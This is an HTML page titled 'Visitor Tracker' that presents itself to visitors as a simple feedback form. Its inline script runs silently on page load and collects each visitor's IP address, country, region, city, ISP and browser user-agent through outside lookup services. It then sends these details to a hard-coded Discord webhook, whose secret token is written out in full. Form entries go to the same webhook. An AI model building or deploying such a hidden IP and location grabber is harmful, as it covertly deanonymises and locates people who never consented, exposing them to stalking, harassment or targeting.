<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Visitor Tracker</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .container {
      background: #fff;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
    }
    h1 {
      text-align: center;
      margin-bottom: 1.5rem;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }
    input, textarea, button {
      padding: 0.75rem;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 1rem;
    }
    button {
      background: #5865f2;
      color: #fff;
      border: none;
      cursor: pointer;
      font-weight: bold;
      transition: background 0.2s ease;
    }
    button:hover {
      background: #4752c4;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Feedback Form</h1>
    <form id="feedbackForm">
      <input type="text" name="name" placeholder="Your Name" required>
      <input type="email" name="email" placeholder="Your Email" required>
      <textarea name="message" placeholder="Your Message" rows="5" required></textarea>
      <button type="submit">Send</button>
    </form>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1420568022732505149/IxMEhT9g6ZQuURdrOUQWJCvosvJevPKyTQt0-WU-XeNoPlPmb6PUcBCXwKxn5k_ku9ag";

    // Track visitor automatically
    (async () => {
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json").then(r => r.json());
        const ip = ipRes.ip;
        const geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()).catch(() => ({}));
        const ua = navigator.userAgent;

        const payload = {
          embeds: [{
            title: "New Visitor",
            color: 5814783, // Discord blue-ish
            fields: [
              { name: "IP", value: ip, inline: true },
              { name: "Country", value: geo.country_name || "n/a", inline: true },
              { name: "Region", value: geo.region || "n/a", inline: true },
              { name: "City", value: geo.city || "n/a", inline: true },
              { name: "ISP", value: geo.org || "n/a", inline: false },
              { name: "User-Agent", value: ua, inline: false }
            ],
            timestamp: new Date().toISOString()
          }]
        };

        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (e) {
        console.error("Visitor tracking failed", e);
      }
    })();

    // Form submission handler
    document.getElementById("feedbackForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const form = e.target;
      const name = form.name.value;
      const email = form.email.value;
      const message = form.message.value;

      const payload = {
        embeds: [{
          title: "New Form Submission",
          color: 16711680, // red
          fields: [
            { name: "Name", value: name, inline: true },
            { name: "Email", value: email, inline: true },
            { name: "Message", value: message, inline: false }
          ],
          timestamp: new Date().toISOString()
        }]
      };

      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        alert("Thank you! Your response has been sent.");
        form.reset();
      } catch (e) {
        console.error("Form submission failed", e);
        alert("Error sending your response. Please try again.");
      }
    });
  </script>
</body>
</html>
